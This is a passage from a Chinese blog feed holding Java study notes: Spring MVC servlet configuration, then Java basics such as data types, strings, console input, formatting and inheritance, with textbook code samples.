class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span>=<span class="string">"http://xmlns.jcp.org/xml/ns/javaee</span></span></span><br><span class="line"><span class="tag"><span class="string">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">version</span>=<span class="string">"4.0"</span> &gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Spring MVC Sample<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"> </span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">      org.springframework.web.servlet.DispatcherServlet</span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">load-on-startup</span>&gt;</span>1<span class="tag">&lt;/<span class="name">load-on-startup</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>HelloWeb<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><p>为 DispatcherServlet 映射的URL为”/“，所有访问应用的用户都会由 DispatcherServlet 来预处理，然后再由它转发给后续组件。为 DispatcherServlet 设置的 Servlet 名字为 “HelloWeb”，即必须为 Spring MVC 提供一个名为 HelloWeb-servlet.xml 的配置文件。</p><p>HelloWeb-servlet.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">"http://www.springframework.org/schema/beans"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:context</span> = <span class="string">"http://www.springframework.org/schema/context"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xmlns:xsi</span> = <span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span></span></span><br><span class="line"><span class="tag">  <span class="attr">xsi:schemaLocation</span> = <span class="string">"http://www.springframework.org/schema/beans     </span></span></span><br><span class="line"><span class="tag"><span class="string">  http://www.springframework.org/schema/beans/spring-beans-3.0.xsd</span></span></span><br><span class="line"><span class="tag"><span class="string">  http://www.springframework.org/schema/context </span></span></span><br><span class="line"><span class="tag"><span class="string">  http://www.springframework.org/schema/context/spring-context-3.0.xsd"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span> = <span class="string">"mypack"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">bean</span> <span class="attr">class</span> = <span class="string">"org.springframework.web.servlet.view.InternalResourceViewResolver"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"prefix"</span> <span class="attr">value</span> = <span class="string">"/WEB-INF/jsp/"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">"suffix"</span> <span class="attr">value</span> = <span class="string">".jsp"</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><p>指定解析视图组件的为 InternalResourceViewResolver ，prefix 和 suffix 属性分别设定了视图文件的前缀和后缀。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>《Tomcat 与 Java Web 开发技术详解》—— 孙卫琴</li><li><a href="https://javasec.org/javaweb/" target="_blank" rel="noopener">https://javasec.org/javaweb/</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-Java-Web-目录结构&quot;&gt;&lt;a href=&quot;#1-Java-Web-目录结构&quot; class=&quot;headerlink&quot; title=&quot;1 Java Web 目录结构&quot;&gt;&lt;/a&gt;1 Java Web 目录结构&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/2020/08/23/Java_02/20200816173242.png&quot; alt=&quot;image-20200816173234356&quot;&gt;&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th align=&quot;center&quot;&gt;目录&lt;/th&gt;
&lt;th align=&quot;center&quot;&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;Web应用根目录，存储 jsp 或 html 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded/WEB-INF&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;存放配置文件，不能直接访问&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded/WEB-INF/classes&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;存放编译后的 class 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td align=&quot;center&quot;&gt;/test1_war_exploded/WEB-INF/lib&lt;/td&gt;
&lt;td align=&quot;center&quot;&gt;存放所需 jar 文件，如 JDBC 驱动的 jar 文件&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;p&gt;web.xml：servlet 、servlet mapping 以及其他配置&lt;/p&gt;
&lt;p&gt;编译 servlet 命令：&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;javac  -sourcepath src -classpath D:\soft\server\apache-tomcat-9.0.37\lib\servlet-api.jar -d WEB-INF\classes src\mypack\DispatcherServlet.java&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
      <category term="Web" scheme="https://jlkl.github.io/tags/Web/"/>
    
      <category term="Java" scheme="https://jlkl.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java 基础</title>
    <link href="https://jlkl.github.io/2020/08/23/Java_01/"/>
    <id>https://jlkl.github.io/2020/08/23/Java_01/</id>
    <published>2020-08-23T07:16:59.000Z</published>
    <updated>2020-08-23T07:32:28.105Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1-Java-概述"><a href="#1-Java-概述" class="headerlink" title="1 Java 概述"></a>1 Java 概述</h2><p>2014 Java8</p><p>2017 Java9</p><p>Java11 LTS版</p><h2 id="2-Java-程序设计环境"><a href="#2-Java-程序设计环境" class="headerlink" title="2 Java 程序设计环境"></a>2 Java 程序设计环境</h2><h3 id="2-1-Java-术语"><a href="#2-1-Java-术语" class="headerlink" title="2.1 Java 术语"></a>2.1 Java 术语</h3><ul><li><p>JDK: Java开发工具(包含JRE)</p></li><li><p>JRE: Java运行环境</p></li><li><p>Java SE (Standard Edition) 标准版本：用于桌面或者简单服务器应用的Java平台</p></li><li><p>Java EE (Enterprise Edition) 企业版本：用于复杂服务器应用的Java平台</p></li><li><p>Java ME (Micro Edition) 微型版本：用于小型设备的Java平台</p></li><li><p>NetBeans：Oracle公司的集成开发环境</p></li></ul><a id="more"></a><h3 id="2-2-命令行工具编译运行"><a href="#2-2-命令行工具编译运行" class="headerlink" title="2.2 命令行工具编译运行"></a>2.2 命令行工具编译运行</h3><p>javac 是一个 Java 编译器，将文件 Welcome.java 编译成 Welcome.class，java 程序启动 Java 虚拟机，虚拟机执行类文件中的字节码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Welcome.java</span><br><span class="line">java Welcome</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li><code>java Welcome</code>，java 区分大小写</li><li>javac 需要文件名（Welcome.java），而运行程序时，只需指定类名，不需要带扩展名 <code>.java</code> 或 <code>.class</code></li></ul><p>常见错误及解决方法：</p><p><a href="https://docs.oracle.com/javase/tutorial/getStarted/problems/index.html" target="_blank" rel="noopener">https://docs.oracle.com/javase/tutorial/getStarted/problems/index.html</a></p><h3 id="2-3-JShell"><a href="#2-3-JShell" class="headerlink" title="2.3 JShell"></a>2.3 JShell</h3><p>Java 9 以上，交互式窗口</p><blockquote><p>那么何时开始使用IDE工具呢？标准是：如果你还离不开这个IDE工具，那么你就不能使用这个IDE工具；只有当你十分清楚在IDE工具里单击每一个菜单，单击每一个按钮……IDE工具在底层为你做的每个细节时，才可以使用IDE工具！</p></blockquote><h2 id="3-Java-基本程序设计"><a href="#3-Java-基本程序设计" class="headerlink" title="3 Java 基本程序设计"></a>3 Java 基本程序设计</h2><h3 id="3-1-简单结构"><a href="#3-1-简单结构" class="headerlink" title="3.1 简单结构"></a>3.1 简单结构</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">FirstSample</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意：</p><ul><li>Java 区分大小写</li><li>Java 类名必须以字母开头，后面跟字母和数字的组合，长度基本没有限制，但不能用 Java 保留字。采用驼峰命名法（camel case），CamelCase</li><li>源代码文件名必须与公共类名字相同，并用 <code>.java</code> 为拓展名</li><li>main 方法必须声明为 public</li></ul><h3 id="3-2-注释"><a href="#3-2-注释" class="headerlink" title="3.2 注释"></a>3.2 注释</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">/**/</span></span><br><span class="line">以<span class="comment">/**开头,*/</span>结束，多用于类的注释</span><br></pre></td></tr></table></figure><h3 id="3-3-数据类型"><a href="#3-3-数据类型" class="headerlink" title="3.3 数据类型"></a>3.3 数据类型</h3><p>强类型语言，8中基本类型</p><h4 id="3-3-1-整型"><a href="#3-3-1-整型" class="headerlink" title="3.3.1 整型"></a>3.3.1 整型</h4><table><thead><tr><th align="center">类型</th><th align="center">字节数</th><th align="center">取值范围</th></tr></thead><tbody><tr><td align="center">int</td><td align="center">4</td><td align="center">-2147483648~2147483647(刚超过20亿)</td></tr><tr><td align="center">short</td><td align="center">2</td><td align="center">-32 768~32 767</td></tr><tr><td align="center">long</td><td align="center">8</td><td align="center">-9223372036854775808~9223372036854775807</td></tr><tr><td align="center">byte</td><td align="center">1</td><td align="center">-128~127</td></tr></tbody></table><ul><li>long 类型后面有一个后缀 L 或 l (40000000L)。十六进制 0x 或 0X。八进制前缀 0</li><li>Java 7 开始加上前缀 0b 或 0B 可以写二进制数。另外还可以为数字变量加上下划线，如 1_000_000 表示 100 万</li></ul><h4 id="3-3-2-浮点类型"><a href="#3-3-2-浮点类型" class="headerlink" title="3.3.2 浮点类型"></a>3.3.2 浮点类型</h4><table><thead><tr><th align="center">类型</th><th align="center">字节数</th><th align="center">有效位数</th></tr></thead><tbody><tr><td align="center">float</td><td align="center">4</td><td align="center">6~7位</td></tr><tr><td align="center">double</td><td align="center">8</td><td align="center">15位</td></tr></tbody></table><ul><li><p>float 类型后有一个后缀 F 或 f ，没有后缀的浮点数值默认为 double 类型</p></li><li><p>三个特殊的浮点数值：<br>正无穷大、负无穷大、NaN（不是一个数字）<br>Double.POSITIVE_INFINITY、Double.NEGATIVE_INFINITY、Double.NaN分别表示这三个特殊值<br>==注意判断时不能直接 == ，使用 <code>Double.isNaN</code> 方法判断==</p></li><li><p>==浮点值不适用于无法接受舍入误差的金融计算==<br>如，<code>System.out.println(2.0-1.1)</code>将打印出 0.8999999999999999 而不是 0.9，这是因为浮点数值采用二进制系统表示，在其中无法精确地表示分数 1/10，对于这种情况换用 <code>BigDecimal</code> 类</p></li></ul><h4 id="3-3-3-char-类型"><a href="#3-3-3-char-类型" class="headerlink" title="3.3.3 char 类型"></a>3.3.3 char 类型</h4><p>最好不要使用这种类型</p><blockquote><p>1个java的char字符并不完全等于一个unicode的字符。char采用的UCS-2编码，是一种淘汰的UTF-16编码，编码方式最多有65536种，远远少于当今Unicode拥有11万字符的需求。java只好对后来新增的Unicode字符用2个char拼出1个Unicode字符。导致String中char的数量不等于unicode字符的数量。 </p></blockquote><h4 id="3-3-4-boolean-类型"><a href="#3-3-4-boolean-类型" class="headerlink" title="3.3.4 boolean 类型"></a>3.3.4 boolean 类型</h4><p>boolean 只有两个值 true 和 false</p><ul><li>java中 true != 1,false != 0</li></ul><h3 id="3-4-变量与常量"><a href="#3-4-变量与常量" class="headerlink" title="3.4 变量与常量"></a>3.4 变量与常量</h3><p>Java 10 开始，可以使用 var 关键字而无需指定类型</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">12</span>;</span><br><span class="line"><span class="keyword">var</span> c = <span class="string">"hello"</span>;</span><br></pre></td></tr></table></figure><h4 id="3-4-1-常量"><a href="#3-4-1-常量" class="headerlink" title="3.4.1 常量"></a>3.4.1 常量</h4><p>用 <code>final</code> 指示常量，表示这个常量只能被赋值一次。习惯上，常量名使用全大写。</p><h4 id="3-4-2-枚举类型"><a href="#3-4-2-枚举类型" class="headerlink" title="3.4.2 枚举类型"></a>3.4.2 枚举类型</h4><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public <span class="class"><span class="keyword">enum</span> <span class="title">Size</span> &#123;<span class="title">SMALL</span>, <span class="title">MEDIUM</span>, <span class="title">LARGE</span>&#125;</span></span><br></pre></td></tr></table></figure><h3 id="3-5-运算符"><a href="#3-5-运算符" class="headerlink" title="3.5 运算符"></a>3.5 运算符</h3><p><img src="/2020/08/23/Java_01/20200807171300.png" alt="image-20200807171257887"></p><h3 id="3-6-字符串"><a href="#3-6-字符串" class="headerlink" title="3.6 字符串"></a>3.6 字符串</h3><p>字符串用双引号括起来</p><ol><li><p>子串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String greeting = <span class="string">"Hello"</span>;</span><br><span class="line">String s = greeting.substring(<span class="number">0</span>, <span class="number">3</span>);<span class="comment">//左闭右开思想</span></span><br></pre></td></tr></table></figure></li><li><p>拼接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">String message = <span class="string">"Hello"</span> + <span class="string">"World"</span>;</span><br></pre></td></tr></table></figure><p>连在一起，用界定符分隔，用 <code>join</code> 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String all = String.join(<span class="string">"/"</span>, <span class="string">"S"</span>, <span class="string">"M"</span>, <span class="string">"L"</span>, <span class="string">"XL"</span>);</span><br><span class="line"><span class="comment">// all is string "S/M/L/XL"</span></span><br></pre></td></tr></table></figure><p>Java 11 还提供了一个 repeat 方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String repeated = <span class="string">"Java"</span>.repeat(<span class="number">3</span>);</span><br><span class="line"><span class="comment">// "JavaJavaJava"比较字符串是否相等</span></span><br></pre></td></tr></table></figure></li><li><p>判断字符串相等</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"Hello"</span>.equals(greeting);</span><br></pre></td></tr></table></figure></li><li><p>构建字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">StringBuilder builder = <span class="keyword">new</span> StringBuilder();<span class="comment">//Java5+</span></span><br><span class="line">builder.append(ch);</span><br><span class="line">builder.append(str);</span><br><span class="line">String myString = builder.toString();</span><br></pre></td></tr></table></figure></li></ol><h3 id="3-7-输入与输出"><a href="#3-7-输入与输出" class="headerlink" title="3.7 输入与输出"></a>3.7 输入与输出</h3><h4 id="3-7-1-读取输入"><a href="#3-7-1-读取输入" class="headerlink" title="3.7.1 读取输入"></a>3.7.1 读取输入</h4><p>首先构造一个与 System.in 相关联的 Scanner 对象，然后使用 Scanner 对象的方法进行读取</p><p>Scanner 对象属于 java.util 包，==不属于 java.lang 包的，都需要 import==</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * This program demonstrates console input.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.10 2004-02-10</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Cay Horstmann</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">InputTest</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      Scanner in = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line"></span><br><span class="line">      <span class="comment">// get first input</span></span><br><span class="line">      System.out.print(<span class="string">"What is your name? "</span>);</span><br><span class="line">      String name = in.nextLine();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// get second input</span></span><br><span class="line">      System.out.print(<span class="string">"How old are you? "</span>);</span><br><span class="line">      <span class="keyword">int</span> age = in.nextInt();</span><br><span class="line"></span><br><span class="line">      <span class="comment">// display output on console</span></span><br><span class="line">      System.out.println(<span class="string">"Hello, "</span> + name + <span class="string">". Next year, you'll be "</span> + (age + <span class="number">1</span>));</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Java 6 引入 Console 类读取密码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Console cons = System.console();</span><br><span class="line">String username = cons.readLine(<span class="string">"Username: "</span>);</span><br><span class="line"><span class="keyword">char</span>[] passwd = cons.readPassword(<span class="string">"Password: "</span>);<span class="comment">//安全起见，返回密码存放在字符数组中。密码处理完成后，应马上用一个填充值覆盖字符数组元素</span></span><br></pre></td></tr></table></figure><h4 id="3-7-2-格式化输出"><a href="#3-7-2-格式化输出" class="headerlink" title="3.7.2 格式化输出"></a>3.7.2 格式化输出</h4><p>System.out.print 和 C 语言的语法差不多</p><p>格式化打印时间：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%tc"</span>, <span class="keyword">new</span> Date());</span><br><span class="line"><span class="comment">//周六 8月 08 18:12:27 CST 2020</span></span><br><span class="line"></span><br><span class="line">Y年m月d日H时M分S秒</span><br></pre></td></tr></table></figure><p>一个参数可被多次使用，添加索引方式，索引必须以 <code>%</code> 开头，以 <code>$</code> 结束</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%1$s %2$tB %2$tm, %2$tY"</span>, <span class="string">"Due date: "</span>, <span class="keyword">new</span> Date());</span><br><span class="line"><span class="comment">//Due date:  八月 08, 2020</span></span><br></pre></td></tr></table></figure><p>也可以使用 <code>&lt;</code> 知识前面的参数将被再次使用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">"%s %tB %&lt;tm, %&lt;tY"</span>, <span class="string">"Due date: "</span>, <span class="keyword">new</span> Date());</span><br></pre></td></tr></table></figure><h4 id="3-7-3-文件输入输出"><a href="#3-7-3-文件输入输出" class="headerlink" title="3.7.3 文件输入输出"></a>3.7.3 文件输入输出</h4><h3 id="3-8-大数"><a href="#3-8-大数" class="headerlink" title="3.8 大数"></a>3.8 大数</h3><p>BigInteger 和 BigDecimal 可以分实现任意精度的整数和浮点数的计算</p><p>valueof 方法将普通的数值转化成大数：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BigInteger a = BigInteger.valueOf(<span class="number">100</span>);</span><br></pre></td></tr></table></figure><p>不能使用算法运算符(+和*)处理大数，而需要使用 add 和 multipy 方法</p><h2 id="4-对象与类"><a href="#4-对象与类" class="headerlink" title="4 对象与类"></a>4 对象与类</h2><h3 id="4-1-访问控制符"><a href="#4-1-访问控制符" class="headerlink" title="4.1 访问控制符"></a>4.1 访问控制符</h3><ul><li>private —— 仅对本类可见</li><li>public —— 对外部完全可见</li><li>protected —— 对本包和所有子类可见</li><li>默认，不需要修饰符 —— 对本包可见</li></ul><h3 id="4-2-包"><a href="#4-2-包" class="headerlink" title="4.2 包"></a>4.2 包</h3><p>用命令行编译运行带包的 java 文件层，需要在上一层且带上包名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac inheritance\ManagerTest.java</span><br><span class="line">java inheritance.ManagerTest</span><br></pre></td></tr></table></figure><h2 id="5-继承"><a href="#5-继承" class="headerlink" title="5 继承"></a>5 继承</h2><h3 id="5-1-类，超类和子类"><a href="#5-1-类，超类和子类" class="headerlink" title="5.1 类，超类和子类"></a>5.1 类，超类和子类</h3><p>已存在的类被称为超类（superclass）、基类（base class）或父类（parent class）；新类被称为子类（subclass）、派生类（derived class）或孩子类（child class）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.horstmann.corejava;</span><br><span class="line"></span><br><span class="line"><span class="comment">// the classes in this file are part of this package</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.*;</span><br><span class="line"></span><br><span class="line"><span class="comment">// import statements come after the package statement</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@version</span> 1.11 2015-05-08</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> Cay Horstmann</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> <span class="keyword">double</span> salary;</span><br><span class="line">   <span class="keyword">private</span> LocalDate hireDay;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(String name, <span class="keyword">double</span> salary, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>.name = name;</span><br><span class="line">      <span class="keyword">this</span>.salary = salary;</span><br><span class="line">      hireDay = LocalDate.of(year, month, day);</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> name;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> salary;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> LocalDate <span class="title">getHireDay</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">return</span> hireDay;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">raiseSalary</span><span class="params">(<span class="keyword">double</span> byPercent)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      <span class="keyword">double</span> raise = salary * byPercent / <span class="number">100</span>;</span><br><span class="line">      salary += raise;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Manager</span> <span class="keyword">extends</span> <span class="title">Employee</span></span>&#123;</span><br><span class="line">……</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>覆盖方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">double</span> <span class="title">getSalary</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">double</span> baseSalary = <span class="keyword">super</span>.getSalary();</span><br><span class="line">    <span class="comment">//不能直接用salary，因为它在Employee类中是private的</span></span><br><span class="line"><span class="keyword">return</span> baseSalary+bonus;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子类构造器</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">Manager</span><span class="params">(String name, <span class="keyword">double</span> salary, <span class="keyword">int</span> year, <span class="keyword">int</span> month, <span class="keyword">int</span> day)</span></span>&#123;</span><br><span class="line"><span class="keyword">super</span>(name, salary, year. month, day);</span><br><span class="line">bonus = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 